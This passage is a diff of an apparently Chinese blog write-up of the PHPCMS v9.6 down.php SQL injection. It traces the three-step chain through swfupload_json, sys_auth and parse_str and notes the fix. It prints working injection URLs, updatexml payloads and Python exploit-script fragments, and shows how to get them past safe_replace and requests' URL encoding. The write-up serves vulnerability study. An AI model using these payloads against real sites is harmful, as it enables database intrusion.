-<h3 id="分析step2"><a href="#分析step2" class="headerlink" title="分析step2:"></a>分析step2:</h3><p>​    接下来我们分析step2,为什么POST请求数据中需要添加<code>userid_flash</code>字段以及对应的值是怎么来的</p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209174219035.png" alt="image-20210209174219035"></p>
-<p>在step2访问的请求文件中，类中的构造函数初始化会判断（21-23行）是否有<code>$this-&gt;userid</code>，那么这个<code>$this-&gt;userid</code>是怎么来的呢，17行对它进行了赋值</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">&#x27;userid&#x27;</span>] ? $_SESSION[<span class="string">&#x27;userid&#x27;</span>] : (param::get_cookie(<span class="string">&#x27;_userid&#x27;</span>) ? param::get_cookie(<span class="string">&#x27;_userid&#x27;</span>) : sys_auth($_POST[<span class="string">&#x27;userid_flash&#x27;</span>],<span class="string">&#x27;DECODE&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这一行代码，通过三元运算符判断$_SESSION[&#x27;userid&#x27;]是否有值，我们第一步利用中，肯定是没有值的，然后执行(param::get_cookie(&#x27;_userid&#x27;)，然后我们cookie也没有_userid，所以最终$this-&gt;userid = sys_auth($_POST[&#x27;userid_flash&#x27;],&#x27;DECODE&#x27;));</span></span><br></pre></td></tr></table></figure>
-
-<p><code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;))</code>就是对我们step2中<code>userid_flash</code>的值进行解密，这里跟step解密是同一个函数，这里走下来，<code>$this-&gt;userid=1</code>，就过了21行的判断</p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209180751064.png" alt="image-20210209180751064"></p>
-<p>接着我们查看<code>  /phpcms/modules/attachment/attachments.php</code>分析<code>swfupload_json</code>函数</p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209181444482.png" alt="image-20210209181444482"></p>
-<p>这里使用了<code>safe_replace</code>函数对<code>$_GET[&#39;src&#39;]</code>的值进行过滤，函数内容如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $_GET[&#x27;src&#x27;] = &amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&quot;&#123;&quot;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面<code>id=*%27..</code> 经过<code>safe_replace</code>就变成了<code>id=%27...</code>（加<code>*</code>目的就是为了过<code>safe_replace</code>函数），继续往后走,将我们的sql代码进行了<code>set_cookie</code></p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209182026023.png" alt="image-20210209182026023"></p>
-<p>然后这里的<code>set_cookie</code>又正好调用了<code>sys_auth</code>函数进行加密</p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209182250488.png" alt="image-20210209182250488"></p>
-<h3 id="分析step1"><a href="#分析step1" class="headerlink" title="分析step1"></a>分析step1</h3><p>​    <code>userid_flash =a291M4pDz3fa59ilYnOLNL_60K5piWuJbrMMzdL_ </code></p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209183944123.png" alt="image-20210209183944123"></p>
-<p><code>/phpcms/libs/classes/param.class.php</code>中调用<code>set_cookie</code>中<code>sys_auth</code>函数进行加密。</p>
-<h3 id="梳理"><a href="#梳理" class="headerlink" title="梳理"></a>梳理</h3><p>总的来说就是step1中调用<code>set_cookie</code>中<code>sys_auth</code>函数进行加密，然后step2中<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</code>获取解密(绕过报错)，在这一步，GET请求附带了sql报错注入一句，且使用<code>*</code>绕过<code>safe_replace</code>，然后加密，到了step3，通过<code>$a_k</code>的传值又进行解密，然后执行，漏洞就产生了</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/275/">https://paper.seebug.org/275/</a></li>
+<p>执行效果如下：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328141903180.png" alt="image-20210328141903180"></p>
+<p>脚本在对<font color="red">Stpe2</font>那里进行了与手工不一样的处理，原因就是按照手工的方法进行编写的脚本会报错，具体是什么问题以及原因<font color="red">看文尾的分析。</font>&gt;值得一看！！！</p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>为了更好的理解这个漏洞产生的原因，我们采取的方式是从后往前分析。</p>
+<p>根据<font color="red">step3</font>请求的URL地址，可以定位到<code>phpcms\modules\content\down.php</code>文件<code>init</code>函数：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327180215866.png" alt="image-20210327180215866"></p>
+<p>上面代码通过GET获取到了<code>$a_k</code>的值,然后将<code>$a_k</code>带入<code>sys_auth</code>函数进行解密（<code>DECODE</code>）,至于是如何加密的，我们无需关心，但是我们要知道的是<code>$a_k</code>的值是从拿来的，也就是<font color="red">Step2</font>构造的语句是哪里进行加密处理的，还有就是加密用的key。</p>
+<p>执行到17行，此时<code>$a_k=&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;&amp;id=%27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=Tao&quot;,&quot;filename&quot;:&quot;&quot;&#125;</code>，这里还需要注意<code>parse_str</code>这个函数</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328190127279.png" alt="image-20210328190127279"></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328190156309.png" alt="image-20210328190156309"></p>
+<p>通过官方给的例子可知，<code>parse_str</code>会将传入的值根据<code>&amp;</code>进行分割。然后解析注册变量。并且会对内容进行URL解码。</p>
+<p>为了更好的理解上面这段话，看下图：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327180803311.png" alt="image-20210327180803311"></p>
+<p>由图可知，当执行<code>parse_str</code>函数，他会进行以下步骤：</p>
+<ul>
+<li>1.根据&amp;符解析<code>$a_k</code>的值，注册变量</li>
+<li>2.将解析后变量的值进行URL解码</li>
 </ul>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327183751439.png" alt="image-20210327183751439"></p>
+<p>继续执行，到26进行了SQL语句执行，跟进一下</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327181035109.png" alt="image-20210327181035109"></p>
+<p>上图可知，执行的SQL语句如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> `phpcmsv96`.`v9_news_data` WHERE  `id` = <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">1</span>,(user())),<span class="number">1</span>)<span class="comment">#&#x27; LIMIT 1</span></span><br></pre></td></tr></table></figure>
+
+<p>我们将语句放到数据库执行一下。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327181243461.png" alt="image-20210327181243461"></p>
+<p>正常返回了，但去掉<code>#</code>，报错，如下图：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327181307957.png" alt="image-20210327181307957"></p>
+<p>这就是为什么<font color="red">Step2</font>处，构造的SQL报错语句后面添加<code>#</code>进行注释</p>
+<p>接下来分析<font color="red">Step2</font>,我们需要弄明白，<code>$a_k</code>的值是怎么得到的，以及为什么POST请求数据中需要添加<code>userid_flash</code>字段和对应的值是怎么来的。</p>
+<p>根据Step2的请求，我们定位到<code>/phpcms/modules/attachment/attachments.php</code>中<code>swfupload_json</code>函数。</p>
+<p>由于<code>swfupload_json</code>方法是<code>attachments</code>类中的一个方法，我们看看类中的构造函数。（不知道你有没有发现什么）</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327194234490.png" alt="image-20210327194234490"></p>
+<p>类中的构造函数初始化会判断（21-23行）是否有<code>$this-&gt;userid</code>，那么这个<code>$this-&gt;userid</code>是怎么来的呢，17行对它进行了赋值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">&#x27;userid&#x27;</span>] ? $_SESSION[<span class="string">&#x27;userid&#x27;</span>] : (param::get_cookie(<span class="string">&#x27;_userid&#x27;</span>) ? param::get_cookie(<span class="string">&#x27;_userid&#x27;</span>) : sys_auth($_POST[<span class="string">&#x27;userid_flash&#x27;</span>],<span class="string">&#x27;DECODE&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>上面的这一行代码，通过三元运算符判断<code>$_SESSION[&#39;userid&#39;]</code>是否有值，我们第一步利用中，肯定是没有值的，然后执行<code>(param::get_cookie(&#39;_userid&#39;)</code>，然后我们cookie也没有<code>_userid</code>，所以最终<code>$this-&gt;userid = sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</code></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327194935840.png" alt="image-20210327194935840"></p>
+<p><code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;))</code>就是对我们step2中<code>userid_flash</code>的值进行解密,这里跟Step3解密是同一个函数，走下来，<code>$this-&gt;userid=1</code>，就过了21行的判断。这也就是为什么POST请求数据中添加<code>userid_flash</code>字段。</p>
+<p>接着分析<code>swfupload_json</code>方法</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195154232.png" alt="image-20210327195154232"></p>
+<p>这里通过GET请求获取了<code>src</code>的值（报错注入语句）。并且经过了<code>safe_replace</code>函数的处理。跟进一下此还能输，看看如何处理的。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195328966.png" alt="image-20210327195328966"></p>
+<p>这个函数的功能就是对一些特殊字符进行了过滤，当经过这个函数，未作处理<code>$string</code>值为<code>&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=Tao</code>。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195419521.png" alt="image-20210327195419521"></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195446784.png" alt="image-20210327195446784"></p>
+<p>走完以后，它将我们传入的<code>%*27</code>变成了<code>%27</code>。（上上图进行过滤的）这也就是为什么要加<code>*</code>号</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195633409.png" alt="image-20210327195633409"></p>
+<p>继续执行，到244行由于cookie中没有<code>att_json</code>，所以跳转至250行进行设置cookie。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195855574.png" alt="image-20210327195855574"></p>
+<p>可以发现，这里cookie加密也是用的<code>sys_auth</code>函数(跟<font color="red">Step3</font>解密用的同一个函数)，这里的key未指定，我们跟进一下这个函数。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327200212416.png" alt="image-20210327200212416"></p>
+<p>图中可以得知，当<code>key</code>为空时，使用<code>pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;)</code>。跟<font color="red">Step3</font>使用的一致。</p>
+<p>接着分析<font color="red">Step1</font></p>
+<p>前面提到为什么加<code>userid_flash</code>参数，<code>$this-&gt;userid = sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</code>，为了过是否登录的判断。而且这里传入<code>userid_flash</code>的值必须是合法的cookie，也就是通过<code>set_cookie</code>函数设置的cookie，而又因<code>set_cookie</code>函数设置cookie会通过<code>sys_auth</code>加密。这样的解密才有效。</p>
+<p>因此我们需要找到从哪里无添加即可获取cookie，这里利用的是wap模块的接口。在<code>phpcms/modules/wap/index.php</code></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327203005540.png" alt="image-20210327203005540"></p>
+<p>上图代码处通过GET获取<code>siteid</code>的值,然后为其设置cookie。</p>
+<p>整个漏洞的利用流程如下：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328185153027.png" alt="image-20210328185153027"></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328184248076.png" alt="image-20210328184248076"></p>
+<p>对<code>$a_k</code>进行了过滤，且将<code>$id</code>进行了类型转换</p>
+<h2 id="前面提到问题的分析"><a href="#前面提到问题的分析" class="headerlink" title="前面提到问题的分析"></a>前面提到问题的分析</h2><p>不知道你们有没有发现，手工利用跟脚本实现的时候不太一样（见下图）</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328142217269.png" alt="image-20210328142217269"></p>
+<p>正常来说，因为手工利用的时候直接访问<code>/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao</code>,那么对应脚本应该如下写：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_two = url + <span class="string">&quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao&quot;</span><span class="comment"># 执行SQL语句，此处可修改</span></span><br></pre></td></tr></table></figure>
+
+<p>但当我们这么写，执行的时候，会报错，报错如下：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327154645630.png" alt="image-20210327154645630"></p>
+<p>刚开始我还以为是URL写错了，后面又测了一遍。发现手工可以，但是带到脚本就不行。由于<font color="red">Step2</font>是本脚中最重要的环节，我就很确切的就把问题定位到了这里。最后实在没办法了（想搞懂为什么会这样），被requests这个库逼到绝路了(脚本这个错排了好久的😭)，于是我就去看了一下requests库的源代码，看看它对url是怎么处理的。最终得到的结果就是<font color="red">requests库对请求的url做了<code>urlencode</code></font>。当我得到这个结论的时候，大佬告诉我<code>不encode怎么传递</code>，我直接好家伙，当时我怎么就没想到这个呢。但后面又仔细想了想，分析这些漏洞，根据前辈的poc，学习这些手法，那么这些手法大多数不就是不按套路出牌嘛。（我也不知道我自己再说啥，反正玄学。。。）</p>
+<p>进行<code>urlencode</code>在下处：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327231720576.png" alt="image-20210327231720576"></p>
+<p>执行的流程如下：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328213156138.png" alt="image-20210328213156138"></p>
+<p>回归正传，在这里我们以Step2请求的url为例：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.phpcms96.com/index.php/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao</span><br></pre></td></tr></table></figure>
+
+<p>正常请求是没问题的，但当使用requests库请求时URL如下：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328144942755.png" alt="image-20210328144942755"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.phpcms96.com/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%2526id=%25*27%2520and%2520updatexml%25281%252Cconcat%25281%252C%2528user%2528%2529%2529%2529%252C1%2529%2523%2526m%253D1%2526modelid%253D1%2526catid%253D1%2526f%253DTao</span><br></pre></td></tr></table></figure>
+
+<p>分析如下图</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328145323190.png" alt="image-20210328145323190"></p>
+<p>就是对我们的url进行了编码，到这里我们仅仅只是发现了<code>requests</code>库对我们的url进行了<code>encode</code>，但php那边为什么会报错我们还没有搞明白，所以我们还得在php那边进行调试观察。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328145945198.png" alt="image-20210328145945198"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">26</span>id=%<span class="number">27</span>andupdatexml%<span class="number">281</span>%<span class="number">2</span>Cconcat%<span class="number">281</span>%<span class="number">2</span>C%<span class="number">28</span>user%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2</span>C1%<span class="number">29</span>%<span class="number">23</span>%<span class="number">26</span>m%<span class="number">3</span>D1%<span class="number">26</span>modelid%<span class="number">3</span>D1%<span class="number">26</span>catid%<span class="number">3</span>D1%<span class="number">26</span>f%<span class="number">3</span>DTao</span><br></pre></td></tr></table></figure>
+
+<p>接着走到Step3的代码位置，可以发现<code>parse_str</code>执行完了，并没有得到<code>$id</code>变量。前面说到<code>parse_str</code>函数是根据<code>&amp;</code>符进行解析注册的。但是由于这里urlencode将我们的<code>&amp;</code>进行编码了，没有解析注册对应的变量。所以报了上面的参数错误。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328150413726.png" alt="image-20210328150413726"></p>
+<p>上面的分析很清楚的说明了问题，就是对url多进行了一次<code>encode</code>。那么怎么解决呢？这时候我猜看到这里的人你们肯定想的是将<font color="red">Step2</font>的URL进行<code>urlencode</code>解码，然后再追加上去（是不是？），那么代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&quot;</span></span><br><span class="line">url_two = url + <span class="string">&quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=&#123;&#125;&quot;</span>.format(payload) </span><br></pre></td></tr></table></figure>
+
+<p>执行如下图，报<code>Controller does not exist.</code></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328160718718.png" alt="image-20210328160718718"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.phpcms96.com/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%2526id=%25*27%20and%20updatexml(1,concat(1,(user())),1)%2523&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao</span><br></pre></td></tr></table></figure>
+
+<p>由于是MVC架构，我们后面的<code>m=1</code>跟前面的<code>m=attachments</code>冲突了。我们将后面的<code>m=1</code>删除试一试。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328161836408.png" alt="image-20210328161836408"></p>
+<p>还有有问题啊，没有<code>&amp;</code>符。看到这里，你肯定又会觉得，直接把id前面的<code>%26</code>改成<code>&amp;</code>不就好了嘛？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&quot;</span></span><br><span class="line">url_two = url + <span class="string">&quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=&#123;&#125;&quot;</span>.format(payload) </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328162339048.png" alt="image-20210328162339048"></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328162419778.png" alt="image-20210328162419778"></p>
+<p><code>src=&#39;&#39;</code>那这个漏洞就没法利用，所以说这个利用思路真的很妙。</p>
+<p>就是删除了<code>m=1</code>,就没办法过下面的代码了。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328173701045.png" alt="image-20210328173701045"></p>
+<p>好了好了不绕了，还是整理一下来说吧（前面还有一些细节点没说到）。前面说了一堆，大概情况总结下来如下图：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328175409487.png" alt="image-20210328175409487"></p>
+<p>则这一切一切原因就是<code>id=%*27</code>这段部分，为什么这么说呢？贴下处理URL的代码吧(重点关注注释<code>!!!</code>的代码)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// requests源代码 urllib3/util/url.py文件</span><br><span class="line"></span><br><span class="line">PERCENT_RE = re.compile(<span class="string">r&quot;%[a-fA-F0-9]&#123;2&#125;&quot;</span>)	<span class="comment"># !!!</span></span><br><span class="line">.....</span><br><span class="line">    component, percent_encodings = PERCENT_RE.subn(</span><br><span class="line">        <span class="keyword">lambda</span> match: match.group(<span class="number">0</span>).upper(), component</span><br><span class="line">    )	<span class="comment"># !!!</span></span><br><span class="line"></span><br><span class="line">    uri_bytes = component.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;surrogatepass&quot;</span>)</span><br><span class="line">    is_percent_encoded = percent_encodings == uri_bytes.count(<span class="string">b&quot;%&quot;</span>)	<span class="comment"># !!!</span></span><br><span class="line">    encoded_component = bytearray()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(uri_bytes)):</span><br><span class="line">        <span class="comment"># Will return a single character bytestring on both Python 2 &amp; 3</span></span><br><span class="line">        byte = uri_bytes[i : i + <span class="number">1</span>]</span><br><span class="line">        byte_ord = ord(byte)</span><br><span class="line">        <span class="keyword">if</span> (is_percent_encoded <span class="keyword">and</span> byte == <span class="string">b&quot;%&quot;</span>) <span class="keyword">or</span> (		<span class="comment"># !!!</span></span><br><span class="line">            byte_ord &lt; <span class="number">128</span> <span class="keyword">and</span> byte.decode() <span class="keyword">in</span> allowed_chars</span><br><span class="line">        ):</span><br><span class="line">            encoded_component += byte</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        encoded_component.extend(<span class="string">b&quot;%&quot;</span> + (hex(byte_ord)[<span class="number">2</span>:].encode().zfill(<span class="number">2</span>).upper()))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encoded_component.decode(encoding)</span><br></pre></td></tr></table></figure>
+
+<p>看到这里，你应该知道怎么回事了吧，如果你还不知道，也没关系。我们通过对比观察现象来说明问题：</p>
+<ul>
+<li>调试将<code>%</code>encode的代码</li>
+</ul>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328180909249.png" alt="image-20210328180909249"></p>
+<ul>
+<li>调试不会将<code>%</code>encode的代码</li>
+</ul>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328181606146.png" alt="image-20210328181606146"></p>
+<p>具体我也不知道怎么说，大概就是我们url编码的数据（比如<code>%27</code>等多个，完整的）通过正则匹配的，需要跟<code>uri_bytes.count(b&quot;%&quot;)</code>获取的相等，而这里由于单独的<code>%</code>（不相等），因此就会被<code>encode</code>。</p>
+<p>由于<font color="red">Step2</font>的poc是需要经过<code>safe_replace</code>处理，然后拼接构造的SQL语句，这里我们只需要将<code>%</code>进行url编码即可，于是我们脚本的poc如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%25*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>到了这一步，还没有完，因为依旧没法成功利用，看下图，还是参数错误。（原因就是前面提到的MVC架构，这里m冲突的问题）</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328182146207.png" alt="image-20210328182146207"></p>
+<p>调试的时候直接到了Step3哪里。<code>$a_k</code>还是空（说明未经过<code>swfupload_json()</code>）</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328194150558.png" alt="image-20210328194150558"></p>
+<p>正常来说执行如下图：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328182535779.png" alt="image-20210328182535779"></p>
+<p>恶意代码是通过src参数传入的，而第3处对其他变量进行了判断。根据前面分析的截图，已知访问Step2链接的时候会进行<code>decode</code>,所以我们需要将<code>&amp;</code>进行url编码，最终的脚本poc如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%25*27 and updatexml(1,concat(1,(user())),1)%23%26modelid=1%26catid=1%26m=1%26f=Tao&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328182942143.png" alt="image-20210328182942143"></p>
+<p>没问题了！！！</p>
+<p>脚本报错的主要原因是<code>id=%*27</code>中这个<code>%</code>搞得鬼（但是这么写也是一定的，绕过<code>safe_replace</code>函数然后拼接SQL语句）。还有<code>&amp;</code>。由此可知，我们只需要将后面<code>id</code>后面的数据编码就可以成功利用。当然啦，最推荐得写法是利用<code>quote</code>函数。这个函数的作用就是进行特殊符号的encode。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328183316790.png" alt="image-20210328183316790"></p>
+<p>看到这里，肯定又会有人要问了，你上面调用的是<code>requests.utils.quote()</code>，怎么放的图是<code>urllib.parse.unquote()</code>。</p>
+<blockquote>
+<p><code>urllib.parse.unquote</code>官方文档有说明，<code>requests</code>是第三方库，它官网文档我没看到对此函数的说明。但是都是一样的。</p>
+</blockquote>
+<p>使用这个函数后，访问的URL如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;http://www.phpcms96.com/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%25%2A27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%2523%26modelid%3D1%26catid%3D1%26m%3D1%26f%3DTao&#x27;</span></span><br></pre></td></tr></table></figure>
+
